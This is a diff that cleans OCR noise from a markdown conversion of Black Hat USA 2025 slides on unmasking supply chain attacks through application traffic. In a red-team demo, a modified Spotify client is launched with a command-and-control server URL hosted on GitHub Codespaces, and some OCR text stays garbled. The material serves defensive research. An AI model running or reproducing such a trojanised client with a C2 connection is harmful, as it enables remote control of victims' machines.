@@ -22,7 +22,6 @@ converted_at: "2026-08-11T22:52:02Z"
 **Conference:** Black Hat USA 2025  
 **Source:** `BlackHat_USA_2025_Slides/Colin Estep&Dagmawi Mulugeta_Your Traffic Doesn't Lie Unmasking Supply Chain Attacks via Application Behaviour.pdf` (66 pages)
 
-
 ## Slide 1
 
 ### Your Traffic Doesn't Lie: Unmasking Supply Chain Attacks via Application Behaviour
@@ -224,7 +223,6 @@ xqpt5z.dagmawi.io
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-pisekhat r) AS ne co, 4
 BRIEFINGS wf, {<a | he i -
 Software Deployed
 OX
@@ -696,8 +694,6 @@ Command and Control:
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-bisak hat eo 4 — &
-BRIEFINGS SE Ny = 4 \
 : Attacker Setup
 Compromised application: Command and Control:
 = Spotify’
@@ -770,7 +766,6 @@ black hat ; , >
 BRIEFINGS St,
 Red Team: Victim’s Machine
 Spotify client (modified) C2 URL
-ree >> a »
 victim >> ./spotify-client.exe -server="sdper-duper-chains
 -744944gqjxp29rq-8443.app.github.dev"
 41 6
@@ -791,10 +786,8 @@ Victim Interaction
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-2) cS on
 blackhat Aya SS
 BRIEFINGS Sy ES
-—— \ > y)
 Red Team: Attacker’s Console
 Victim
 /codespaces~c2 >> make run .
